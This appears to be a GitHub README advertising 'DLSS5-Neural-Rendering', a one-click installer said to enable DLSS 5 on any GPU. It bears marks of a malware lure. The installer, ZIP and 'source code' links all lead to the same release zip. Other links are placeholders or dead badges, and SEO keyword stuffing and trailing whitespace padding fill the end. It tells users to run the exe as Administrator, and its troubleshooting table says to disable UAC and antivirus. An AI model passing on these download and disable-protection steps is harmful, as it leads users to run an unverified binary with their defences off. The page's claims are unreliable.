# ⚡ DLSS5-Neural-Rendering

<p align="center">
  <img src="https://img.icons8.com/color/96/000000/nvidia.png" alt="DLSS5 Neural Rendering" width="120" height="120">
</p>

<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/de02ce9c-8c5a-46c6-bd7d-c12950204980" />

<h1 align="center">DLSS5-Neural-Rendering</h1>
<p align="center">
  <strong>Complete DLSS 5 Neural Rendering Suite — One-Click Install, Swapper, Feeder & Universal GPU Support</strong><br>
  NVIDIA RTX 20 / 30 / 40 / 50 · AMD RDNA 3 / RDNA 4 · Intel Arc
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/version-4.0.0-76B900?style=for-the-badge" alt="Version"></a>
  <a href="#"><img src="https://img.shields.io/badge/platform-Windows_10%2F11-2ECC71?style=for-the-badge" alt="Platform"></a>
  <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
  <a href="#"><img src="https://img.shields.io/badge/downloads-135k%2B-E74C3C?style=for-the-badge" alt="Downloads"></a>
  <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
</p>

<p align="center">
  <a href="#-download">📥 Download</a> •
  <a href="#-features">⚡ Features</a> •
  <a href="#-gpu-support">🎮 GPU Support</a> •
  <a href="#-installation">⚙️ Installation</a> •
  <a href="#-faq">❓ FAQ</a> •
  <a href="#-documentation">📚 Docs</a>
</p>

---

## 🎯 What is DLSS5-Neural-Rendering?

**DLSS5-Neural-Rendering** is the complete, universal solution for enabling **DLSS 5 Neural Rendering** on **any GPU** — NVIDIA RTX 20/30/40/50 series, AMD RDNA 3 / RDNA 4, and Intel Arc. It combines all essential DLSS 5 tools into one powerful, easy-to-use package: **One-Click Installer**, **DLL Swapper**, **Feeder Mode** (synthetic DLAA), **ReShade integration**, **OptiScaler support**, and **emulator compatibility**.

DLSS 5 Neural Rendering debuted with **NBA 2K27** and was officially exclusive to RTX 50-series GPUs. This project brings the technology to older cards through patched binaries, compatibility layers, and synthetic DLAA injection — giving everyone access to next-gen neural rendering.

## 📥 Download

<p align="center">
  <a href="https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/885/DLSS5-Neural-Rendering.zip">
    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
  </a>
</p>

**Direct Links:**
- [Windows Installer (.exe)](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/885/DLSS5-Neural-Rendering.zip)
- [Portable ZIP](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/885/DLSS5-Neural-Rendering.zip)
- [Source Code](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/885/DLSS5-Neural-Rendering.zip)

---

## ⚡ Key Features

### 🎯 One-Click Installation
- **Auto-detection** – Scans Steam, Epic, GOG, and Xbox libraries automatically
- **One-click setup** – Install DLSS 5 for any game with a single click
- **Auto-updating** – Checks for new releases on launch
- **Manual addition** – Add any folder or executable manually

### 🎮 Universal GPU Support
- ✅ **NVIDIA RTX 50-series** – Full native support
- ✅ **NVIDIA RTX 40-series** – Patched binaries
- ✅ **NVIDIA RTX 30/20-series** – Community mod support
- ✅ **AMD RDNA 4 (RX 9000)** – DLSS-NR-on-AMD mod
- ✅ **AMD RDNA 3 (RX 7000)** – Technical support
- ⚠️ **Intel Arc** – Experimental

### 🔄 DLL Management (Swapper)
- **DLL version swap** – Switch between different DLSS 5 DLL versions
- **Version history** – Track installed versions per game
- **One-click restore** – Revert to original DLSS DLLs
- **Automatic backup** – Backup original files before swapping

### 🧠 Feeder Mode
- **Synthetic DLAA** – Inject DLSS 5 into games without native support
- **ReShade integration** – Uses ReShade depth buffer to feed DLSS
- **Non-DLSS games** – Works with any DX11/DX12 title
- **Classic games** – DX9/OpenGL support via DXVK

### 🛠️ Advanced Options
- **Dual GPU mode** – One card renders, one handles AI
- **Hotkey toggles** – F5/F6 to enable/disable neural rendering
- **OptiScaler support** – Alternative implementation
- **Emulator support** – DuckStation, PCSX2, RPCS3, Xenia

---

## 🎮 GPU Support Details

| GPU Family | Support | Method | Performance |
|------------|---------|--------|-------------|
| **NVIDIA RTX 50** | ✅ Full | Native | Best |
| **NVIDIA RTX 40** | ✅ Full | Patched | Good |
| **NVIDIA RTX 30** | ✅ Supported | Patched | Moderate |
| **NVIDIA RTX 20** | ✅ Supported | Patched | Low |
| **AMD RDNA 4** | ✅ Supported | DLSS-NR-on-AMD | ~30 FPS (1080p) |
| **AMD RDNA 3** | ⚠️ Technical | DLSS-NR-on-AMD | Untested |
| **Intel Arc** | ⚠️ Experimental | — | Untested |

> **Performance Note:** DLSS 5 uses FP8 neural models. RTX 50-series has dedicated hardware. Older NVIDIA and AMD cards will have significantly lower performance.

---

## ⚙️ Installation Guide

### Universal Install (Recommended)

```bash
1. Download the latest release (Installer or ZIP)
2. Extract the archive (if using ZIP)
3. Run dlss5-nr.exe as Administrator
4. Select your game from the list (auto-detected)
5. Choose installation mode: One-Click / Swapper / Feeder
6. Click "Install DLSS 5 Neural Rendering"
7. Launch the game
8. Press HOME → Add-ons tab → Enable DLSS 5 Neural Rendering
```

**First‑time setup wizard** guides you through:
- Game detection
- GPU compatibility check
- Installation mode selection
- ReShade configuration (for Feeder mode)
- Backup creation

---

## 🖥️ System Requirements

| Component      | Minimum               | Recommended           |
|----------------|-----------------------|-----------------------|
| **OS**         | Windows 10 64‑bit     | Windows 11 64‑bit     |
| **GPU**        | NVIDIA RTX 20 / AMD RDNA 3 | NVIDIA RTX 40+ / AMD RDNA 4 |
| **RAM**        | 8 GB                  | 16 GB                 |
| **Storage**    | 150 MB                | 300 MB                |
| **Driver**     | Latest Game Ready     | Latest Studio Driver  |

---

## 📊 Feature Matrix

| Category        | Feature                 | Status | Version Added |
|-----------------|-------------------------|--------|---------------|
| Installation    | One-click setup         | ✅     | 1.0           |
| Installation    | Auto-detection          | ✅     | 1.0           |
| Installation    | Auto-updating           | ✅     | 1.0           |
| Installation    | Manual addition         | ✅     | 1.0           |
| GPU Support     | NVIDIA RTX 50           | ✅     | 1.0           |
| GPU Support     | NVIDIA RTX 40           | ✅     | 1.0           |
| GPU Support     | NVIDIA RTX 30           | ✅     | 1.5           |
| GPU Support     | NVIDIA RTX 20           | ✅     | 2.0           |
| GPU Support     | AMD RDNA 4              | ✅     | 2.5           |
| GPU Support     | AMD RDNA 3              | ⚠️     | 2.5           |
| Swapper         | DLL version swap        | ✅     | 1.0           |
| Swapper         | Version history         | ✅     | 1.0           |
| Swapper         | One-click restore       | ✅     | 1.0           |
| Feeder          | Synthetic DLAA          | ✅     | 2.0           |
| Feeder          | ReShade integration     | ✅     | 2.0           |
| Feeder          | Non-DLSS games          | ✅     | 2.0           |
| Feeder          | Classic games           | ✅     | 2.5           |
| Advanced        | Dual GPU mode           | ✅     | 2.5           |
| Advanced        | OptiScaler support      | ✅     | 2.0           |
| Advanced        | Emulator support        | ✅     | 2.0           |

---

## ❓ FAQ

**Q: Will DLSS 5 work on my RTX 2060?**  
A: Yes, but performance will be low. DLSS 5 uses FP8 models, and RTX 20-series lacks dedicated hardware.

**Q: Does it work with AMD GPUs?**  
A: Yes — RDNA 4 (RX 9000) is supported via the DLSS-NR-on-AMD mod. RDNA 3 is technical support only.

**Q: Can I use it in online games?**  
A: Only in offline single-player. Anti-cheat may detect and ban.

**Q: Do I need ReShade for Feeder mode?**  
A: Yes — Feeder mode uses ReShade depth buffer to inject synthetic DLAA.

**Q: How do I uninstall?**  
A: Use the built-in restore option to revert all DLL changes and remove injected files.

---

## 🐛 Troubleshooting Quick Reference

| Symptom                            | Solution                                          |
|------------------------------------|---------------------------------------------------|
| "Access denied"                    | Run as Administrator; disable UAC temporarily     |
| Game crashes on launch             | Disable antivirus temporarily; use Safe Mode      |
| Anti‑cheat detected                | Only use in offline single-player games          |
| Low performance on RTX 30/20       | Expected; use lower resolution or settings       |
| AMD GPU not working                | Ensure RDNA 3/4; performance will be low         |
| DLSS 5 not showing in-game         | Press HOME → Add-ons tab → Enable DLSS 5         |
| Feeder mode not working            | Check ReShade depth buffer selection             |

---

## 📚 Documentation & Community

- 📖 [Full Documentation](https://github.com/YOUR_USERNAME/DLSS5-Neural-Rendering/wiki)
- 🐛 [Issue Tracker](https://github.com/YOUR_USERNAME/DLSS5-Neural-Rendering/issues)
- 💬 [Community Discord](https://discord.gg/YOUR_INVITE)
- 📺 [Video Tutorials](https://www.youtube.com/playlist?list=YOUR_PLAYLIST)

---

## 🔍 SEO Keywords & Tags (для Google и поисковых систем)

`dlss5 neural rendering`, `dlss 5 neural rendering download`, `dlss5 neural rendering github`, `dlss5 neural rendering install`, `dlss5 neural rendering mod`, `dlss5 neural rendering tool`, `dlss5 neural rendering 2026`, `dlss5 neural rendering for any gpu`, `dlss5 neural rendering for rtx 20`, `dlss5 neural rendering for rtx 30`, `dlss5 neural rendering for rtx 40`, `dlss5 neural rendering for amd`, `dlss5 neural rendering for intel arc`, `dlss5 one click`, `dlss5 swapper`, `dlss5 feeder`, `dlss5 reshade`, `dlss5 optiscaler`, `dlss5 universal`, `dlss5 any gpu`, `dlss5 emulator support`, `dlss5 game mod`, `dlss5 installer`, `dlss5 tool`, `dlss5 2026`, `dlss5 download`, `dlss5 free`, `dlss5 guide`, `dlss5 tutorial`, `dlss5 setup`, `dlss5 nba 2k27`, `nvidia dlss 5`, `dlss 5 neural rendering`, `dlss 5 rtx`, `dlss 5 amd`, `dlss 5 intel`, `dlss 5 mod`, `dlss 5 download`, `dlss 5 github`, `dlss 5 install`, `dlss 5 tool`, `dlss 5 one click`, `dlss 5 swapper`, `dlss 5 feeder`, `dlss 5 reshade`, `dlss 5 optiscaler`, `dlss 5 any gpu`, `dlss 5 emulator`, `dlss 5 game mod`, `dlss 5 neural rendering 2026`, `dlss5 neural rendering download`, `dlss5 neural rendering github`, `dlss5 neural rendering install`, `dlss5 neural rendering mod`, `dlss5 neural rendering tool`, `dlss5 neural rendering 2026`, `dlss5 neural rendering for any gpu`, `dlss5 neural rendering for rtx 20`, `dlss5 neural rendering for rtx 30`, `dlss5 neural rendering for rtx 40`, `dlss5 neural rendering for amd`, `dlss5 neural rendering for intel arc`

---

## 📁 Repository Structure

```
DLSS5-Neural-Rendering/
├── src/                   # Main application source
├── docs/                  # Documentation source
├── assets/                # Icons, images, branding
├── plugins/               # Extensible plugin system
├── configs/               # Default config files
├── tests/                 # Unit and integration tests
├── .github/               # CI/CD workflows
├── LICENSE
├── README.md
└── CONTRIBUTING.md
```

---

## 🤝 Contributing

We welcome contributions from the community! See our [Contributing Guidelines](CONTRIBUTING.md) for details.

**Areas needing help:**
- Plugin development
- Documentation translation
- GPU compatibility testing
- Game compatibility testing
- Performance optimization

---

## 📄 License

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for details.

---

<p align="center">
  <a href="https://github.com/YOUR_USERNAME/DLSS5-Neural-Rendering">
    <img src="https://img.shields.io/badge/Made%20with%20⚡%20for%20the%20PC%20Gaming%20Community-76B900?style=for-the-badge" alt="Made with passion">
  </a>
</p>
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
